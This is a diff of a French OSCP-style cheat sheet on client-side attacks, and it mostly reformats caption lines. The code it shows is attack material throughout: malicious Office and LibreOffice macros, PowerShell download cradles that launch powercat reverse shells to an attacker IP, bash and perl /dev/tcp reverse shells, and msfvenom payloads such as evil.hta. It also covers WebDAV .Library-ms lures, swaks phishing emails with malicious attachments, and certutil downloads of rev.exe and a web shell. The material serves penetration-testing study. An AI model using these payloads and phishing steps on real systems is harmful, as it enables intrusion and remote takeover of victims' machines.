@@ -11,7 +11,7 @@ Comprendre les vecteurs d'interaction avec les postes utilisateurs.
 ## MACROS
 
 
-Commande `sub` pour la rubrique « MACROS ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil sub.</p>
 
 ```text
 Sub AutoOpen()
@@ -27,8 +27,6 @@ Sub MyMacro()
 End Sub
 ```
 
-
-Commande `sub` pour la rubrique « MACROS ».
 
 ```text
 Sub AutoOpen()
@@ -47,14 +45,14 @@ End Sub
 ```
 
 
-Commande `iex` pour la rubrique « MACROS ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil iex.</p>
 
 ```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/powercat.ps1]');powercat -c [attacker-ip] -p [port] -e powershell
 ```
 
 
-Exemple technique pour la rubrique « MACROS ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « MACROS ».</p>
 
 ```powershell
 $text = "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
@@ -63,7 +61,7 @@ Write-Output $encoded
 ```
 
 
-Commande `cmd_str` pour la rubrique « MACROS ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil cmd_str.</p>
 
 ```python
 cmd_str = "[Your Base64 Encoded PowerShell Command]"
@@ -75,7 +73,7 @@ for i in range(0, len(cmd_str), chunk_size):
 ```
 
 
-Commande `sub` pour la rubrique « MACROS ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil sub.</p>
 
 ```text
 Sub AutoOpen()
@@ -104,14 +102,14 @@ End Sub
 Observer les permissions et la configuration de Windows.
 
 
-Commande `wsgidav` pour la rubrique « Windows Library Files ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil wsgidav.</p>
 
 ```bash
 wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/
 ```
 
 
-Commande `powershell.exe` pour la rubrique « Windows Library Files ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil powershell.exe.</p>
 
 ```powershell
 # Create the file as a shortcut in the Windows system to prepare the attack
@@ -123,7 +121,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://
 `.Library-ms`  
 
 
-Exemple technique pour la rubrique « Windows Library Files ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Windows Library Files ».</p>
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -151,7 +149,7 @@ Exemple technique pour la rubrique « Windows Library Files ».
 ## Avancé Exploitation
 
 
-Commande `sub` pour la rubrique « Avancé Exploitation ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil sub.</p>
 
 ```text
 Sub AutoOpen()
@@ -171,8 +169,6 @@ End Sub
 ```
 
 
-Commande `sub` pour la rubrique « Avancé Exploitation ».
-
 ```text
 Sub AutoOpen()
     MyMacro
@@ -190,7 +186,7 @@ End Sub
 ```
 
 
-Exemple technique pour la rubrique « Avancé Exploitation ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Avancé Exploitation ».</p>
 
 ```powershell
 # Using Encodings
@@ -203,8 +199,6 @@ powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCo
 ```
 
 
-Exemple technique pour la rubrique « Avancé Exploitation ».
-
 ```html
 <script>
     var cmd = "[Your JavaScript Command]";
@@ -213,7 +207,7 @@ Exemple technique pour la rubrique « Avancé Exploitation ».
 ```
 
 
-Commande `var` pour la rubrique « Avancé Exploitation ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil var.</p>
 
 ```javascript
 var cmd = "";
@@ -223,7 +217,7 @@ eval(cmd);
 ```
 
 
-Commande `net` pour la rubrique « Avancé Exploitation ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil net.</p>
 
 ```powershell
 net use Z: \\[webdav-server-ip]\DavWWWRoot /user:[username] [password]
@@ -233,7 +227,7 @@ net use Z: \\[webdav-server-ip]\DavWWWRoot /user:[username] [password]
 ### Courriel simple
 
 
-Commande `swaks` pour la rubrique « Courriel simple ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil swaks.</p>
 
 ```bash
 sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
@@ -250,7 +244,7 @@ sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
 ### Courriel avec authentification
 
 
-Commande `swaks` pour la rubrique « Courriel avec authentification ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil swaks.</p>
 
 ```bash
 sudo swaks -t <recipient@example.com> --from <sender@example.com> \
@@ -260,7 +254,7 @@ sudo swaks -t <recipient@example.com> --from <sender@example.com> \
 ```
 
 
-Commande `--auth` pour la rubrique « Courriel avec authentification ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil --auth.</p>
 
 ```text
 --auth LOGIN
@@ -274,7 +268,7 @@ Commande `--auth` pour la rubrique « Courriel avec authentification ».
 ### Email with Custom Headers for Social Engineering
 
 
-Commande `swaks` pour la rubrique « Email with Custom Headers for Social Engineering ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil swaks.</p>
 
 ```bash
 sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
@@ -290,7 +284,7 @@ sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
 ### Alternative Tool sendemail
 
 
-Commande `sendemail` pour la rubrique « Alternative Tool sendemail ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil sendemail.</p>
 
 ```bash
 sendemail -f '[sender]' -t '[recipient]' -s "[smtp_server]:[port]" \
@@ -336,7 +330,7 @@ Moderate · Moderate · Moderate · Simple
 Examiner les permissions et la configuration de Linux.
 
 
-Commande `echo` pour la rubrique « Cibles Linux ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
 
 ```bash
 echo 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1' > shell.sh
@@ -358,14 +352,14 @@ echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 ```
 
 
-Commande `-f` pour la rubrique « Cibles Linux ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil -f.</p>
 
 ```text
 -f elf
 ```
 
 
-Commande `-o` pour la rubrique « Cibles Linux ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil -o.</p>
 
 ```text
 -o shell.elf
@@ -376,7 +370,7 @@ Commande `-o` pour la rubrique « Cibles Linux ».
 `shell.elf`  
 
 
-Commande `sub` pour la rubrique « Cibles Linux ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil sub.</p>
 
 ```text
 Sub RunShell
@@ -390,7 +384,7 @@ End Sub
 ```
 
 
-Commande `python3` pour la rubrique « Cibles Linux ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
 
 ```bash
 python3 -m http.server 80
@@ -401,7 +395,7 @@ python3 -m http.server 80
 `update.odt`  
 
 
-Ouvrir un port d'écoute avec Netcat.
+<p class="oscp-command-note">Ouvrir un port d&#x27;écoute avec Netcat.</p>
 
 ```bash
 nc -lvnp 4444
@@ -412,7 +406,7 @@ nc -lvnp 4444
 `swaks`  
 
 
-Commande `swaks` pour la rubrique « Cibles Linux ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil swaks.</p>
 
 ```bash
 swaks --to target@example.com --from emmanuel@example.com \
@@ -433,21 +427,21 @@ swaks --to target@example.com --from emmanuel@example.com \
 Observer les permissions et la configuration de Windows.
 
 
-Commande `msfvenom` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-psh -o evil.hta
 ```
 
 
-Commande `-f` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil -f.</p>
 
 ```text
 -f hta-psh
 ```
 
 
-Commande `-o` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil -o.</p>
 
 ```text
 -o evil.hta
@@ -459,7 +453,7 @@ Commande `-o` pour la rubrique « Cibles Windows ».
 `exe`  
 
 
-Commande `-f` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil -f.</p>
 
 ```text
 -f exe -o evil.exe
@@ -470,7 +464,7 @@ Commande `-f` pour la rubrique « Cibles Windows ».
 `vbs`  
 
 
-Commande `-f` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil -f.</p>
 
 ```text
 -f vbs -o evil.vbs
@@ -481,7 +475,7 @@ Commande `-f` pour la rubrique « Cibles Windows ».
 `ps1`  
 
 
-Commande `-f` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil -f.</p>
 
 ```text
 -f ps1 -o script.ps1
@@ -492,7 +486,7 @@ Commande `-f` pour la rubrique « Cibles Windows ».
 `dll`  
 
 
-Commande `-f` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil -f.</p>
 
 ```text
 -f dll -o payload.dll
@@ -503,7 +497,7 @@ Commande `-f` pour la rubrique « Cibles Windows ».
 `evil.hta`  
 
 
-Commande `s` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil s.</p>
 
 ```python
 # Python script to split the payload into 50-character chunks
@@ -521,7 +515,7 @@ for i in range(0, len(s), n):
 `Security`  
 
 
-Commande `macro` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil macro.</p>
 
 ```text
 Macro Security
@@ -532,14 +526,14 @@ Macro Security
 `Tools` · `Macros`  
 
 
-Commande `organize` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil organize.</p>
 
 ```text
 Organize Macros
 ```
 
 
-Commande `libreoffice` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil libreoffice.</p>
 
 ```text
 LibreOffice Basic
@@ -550,7 +544,7 @@ LibreOffice Basic
 `Exploit`  
 
 
-Commande `rem` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil rem.</p>
 
 ```text
 REM ***** BASIC *****
@@ -566,7 +560,7 @@ End Sub
 ```
 
 
-Exemple technique pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Cibles Windows ».</p>
 
 ```text
 <INSERT_YOUR_PAYLOAD_CHUNKS>
@@ -577,7 +571,7 @@ Exemple technique pour la rubrique « Cibles Windows ».
 `-nop`  
 
 
-Commande `-w` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil -w.</p>
 
 ```text
 -w hidden
@@ -588,21 +582,17 @@ Commande `-w` pour la rubrique « Cibles Windows ».
 `Shell`  
 
 
-Commande `shell` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil shell.</p>
 
 ```text
 Shell Str, 1
 ```
 
 
-Commande `shell` pour la rubrique « Cibles Windows ».
-
 ```text
 Shell(Str)
 ```
 
-
-Commande `shell` pour la rubrique « Cibles Windows ».
 
 ```text
 Shell Str, 1
@@ -613,14 +603,14 @@ Shell Str, 1
 `Shell`  
 
 
-Ouvrir un port d'écoute avec Netcat.
+<p class="oscp-command-note">Ouvrir un port d&#x27;écoute avec Netcat.</p>
 
 ```bash
 nc -lvnp 444
 ```
 
 
-Commande `swaks` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil swaks.</p>
 
 ```bash
 swaks --to target@example.com --from emmanuel@example.com \
@@ -635,14 +625,14 @@ swaks --to target@example.com --from emmanuel@example.com \
 `exploit.ods`  
 
 
-Commande `python3` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 
-Afficher des informations de la session ou du système.
+<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
 
 ```bash
 systeminfo
@@ -651,7 +641,7 @@ ipconfig /all
 ```
 
 
-Commande `cd` pour la rubrique « Cibles Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil cd.</p>
 
 ```text
 cd C:\xampp\htdocs && certutil -urlcache -split -f http://[attacker_ip]/rev.exe && certutil -urlcache -split -f http://[attacker_ip]/shell.pHp
